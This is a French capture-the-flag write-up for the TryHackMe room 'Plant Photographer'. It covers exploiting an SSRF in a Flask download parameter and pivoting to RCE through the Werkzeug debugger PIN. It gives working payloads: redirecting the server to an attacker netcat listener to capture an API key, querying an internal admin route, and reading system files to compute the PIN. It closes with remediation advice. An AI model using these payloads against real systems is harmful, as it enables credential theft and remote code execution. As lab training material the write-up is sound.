# Rapport d'Analyse de Sécurité : Room "Plant Photographer" (TryHackMe)

Ce document récapitule les étapes d'audit, de configuration des outils et d'exploitation des vulnérabilités de type **SSRF** (Server-Side Request Forgery) et **RCE** (Remote Code Execution) découvertes sur l'application web cible (`10.114.170.144`).

---

## 1. Phase de Reconnaissance & Analyse Initiale

L'inspection du code source HTML de la page d'accueil du portfolio a mis en évidence un mécanisme de téléchargement via le bouton *« Download Resume »*. La structure du lien hypertexte est la suivante :

```html
<a href="/download?server=secure-file-storage.com:8087&id=75482342">
```

### Analyse de la logique interne (Under the Hood) :
* **Dépendance externe :** Le serveur web n'héberge pas directement le document. Il agit comme un intermédiaire en allant récupérer le fichier sur un espace de stockage (`secure-file-storage.com:8087`).
* **Paramètres obligatoires :** Le script Python requiert deux variables pour s'exécuter correctement : `server` (la cible) et `id` (l'identifiant de la ressource).
* **Vecteur d'attaque :** L'absence de filtrage sur le paramètre `server` permet de manipuler la destination des requêtes générées par le serveur lui-même (vulnérabilité SSRF).

---

## 2. Guide d'Utilisation Détaillé de Burp Suite

Pour manipuler efficacement les requêtes HTTP sans interférence du navigateur, l'utilisation du proxy **Burp Suite** est indispensable.

### Étape 1 : Interception de la requête d'origine
1. Lancez **Burp Suite** sur votre machine Kali Linux.
2. Accédez à l'onglet principal **Proxy**, puis au sous-onglet **Intercept**.
3. Assurez-vous que le bouton affiche **Intercept is on** (activé).
4. Cliquez sur **Open Browser** pour utiliser le navigateur sécurisé intégré à Burp Suite.
5. Dans ce navigateur, naviguez vers le site cible ou entrez directement l'URL de téléchargement.
6. La page se met en attente (chargement infini). Dans Burp Suite, la requête brute textuelle apparaît, bloquée en transit.

### Étape 2 : Utilisation du module "Repeater"
Le module **Repeater** permet de modifier une requête et de la renvoyer indéfiniment pour analyser les réponses du serveur en temps réel.
1. Faites un clic droit n'importe où dans le texte de la requête interceptée.
2. Sélectionnez **Send to Repeater** (ou utilisez le raccourci clavier `Ctrl + R`).
3. Allez dans l'onglet **Repeater** situé dans la barre supérieure de Burp Suite. Vous y trouverez votre requête prête à être modifiée dans la colonne de gauche (*Request*).
4. Retournez dans l'onglet **Proxy** et cliquez sur le bouton **Forward** pour libérer la requête initiale du navigateur.

---

## 3. Méthodologie d'Exploitation via SSRF

### Objectif A : Exfiltration de données (Obtention de la Clé API)
Lorsqu'un serveur web communique avec un stockage sécurisé, il transmet souvent des données d'authentification (tokens, clés) en arrière-plan. L'objectif est de détourner cette connexion vers une machine contrôlée par l'analyste.

1. **Préparation de l'écouteur (Terminal Kali) :**
   Ouvrez un terminal et démarrez un écouteur Netcat pour réceptionner la future connexion sortante du serveur :
   ```bash
   nc -lvnp 4444
   ```
2. **Modification dans Burp Suite Repeater :**
   Dans la colonne *Request*, remplacez l'adresse du paramètre `server` par l'adresse IP de votre machine d'attaque et le port de votre écouteur. Conservez impérativement le paramètre `id` pour éviter les erreurs de syntaxe :
   ```http
   GET /download?server=IP_DE_VOTRE_KALI:4444&id=75482342 HTTP/1.1
   Host: 10.114.170.144
   ```
3. **Analyse du résultat :**
   Cliquez sur **Send**. Le serveur web exécute la requête, se connecte à votre terminal Netcat et y déverse ses en-têtes d'authentification HTTP, révélant la clé API en clair dans le champ `X-API-KEY`.

### Objectif B : Exploration Interne (Accès à la Section Admin)
Les interfaces d'administration sont généralement protégées contre les accès externes, mais font confiance aux requêtes provenant du `localhost` (`127.0.0.1`).

1. **Modification dans Burp Suite Repeater :**
   Pour forcer le serveur à s'interroger lui-même sur son port de service interne (`8087`), modifiez la valeur du paramètre `server` pour cibler la route d'administration locale, tout en maintenant la variable `id` :
   ```http
   GET /download?server=127.0.0.1:8087/admin&id=75482342 HTTP/1.1
   Host: 10.114.170.144
   ```
2. **Analyse de la réponse :**
   Cliquez sur **Send**. Inspectez la colonne de droite (**Response**) dans Burp Suite :
   * Le code de statut HTTP doit indiquer `200 OK`.
   * Le serveur web extrait le contenu HTML de sa propre page d'administration privée et l'affiche dans le corps de la réponse, où se trouve le drapeau de la section administrative.

---

## 4. Pivot vers l'Exécution de Code à Distance (RCE via Werkzeug PIN)

Ce site utilise le framework Flask avec le débogueur Werkzeug activé. Bien que la console interactive soit verrouillée, l'algorithme de génération du code PIN repose sur des données système fixes du serveur.

### Étape 1 : Lecture des fichiers locaux indispensables via SSRF
En exploitant la vulnérabilité SSRF sur le paramètre de téléchargement de l'application, l'objectif est de lire des fichiers système internes à la machine afin de récupérer les variables nécessaires au calcul du PIN :
* **L'adresse MAC de l'interface réseau :** `/sys/class/net/eth0/address`
* **L'identifiant unique de la machine :** `/etc/machine-id` ou `/proc/sys/kernel/random/boot_id`

### Étape 2 : Génération du PIN de débogage
Une fois ces informations locales récupérées à l'aide de la SSRF, elles sont injectées dans un script Python de calcul du PIN Werkzeug pour reconstituer le code d'accès exact.

### Étape 3 : Interaction avec la console et obtention d'un Shell
Une fois le PIN généré entré dans la console de débogage Flask, le verrouillage saute, octroyant une exécution de code à distance (RCE) complète. Il devient alors possible d'exécuter des commandes Python directement dans l'interface web pour lister le répertoire de l'application `/usr/src/app` et lire le fichier texte contenant le dernier drapeau du serveur.

* **Commande Python pour lire le fichier (via la console RCE) :**
```python
import os
print(os.listdir('/usr/src/app'))
print(open('/usr/src/app/flag-982374827648721338.txt').read())
```

---

## 5. Mesures de Remédiation (Perspective Défensive)

Pour sécuriser l'application contre les attaques par rebond (SSRF) et l'exécution de code :
* **Désactivation du mode Debug :** Configurer impérativement `debug=False` dans l'application Flask/Werkzeug. Le module de débogage interactif ne doit jamais être exposé en environnement de production.
* **Mise en place d'une liste blanche (Whitelisting) :** Restreindre strictement le code de la fonction de téléchargement afin qu'il n'accepte que le domaine légitime (`secure-file-storage.com`). Toute requête pointant vers des IP locales (`127.0.0.1`, `localhost`) ou des adresses IP externes non répertoriées doit être immédiatement rejetée.
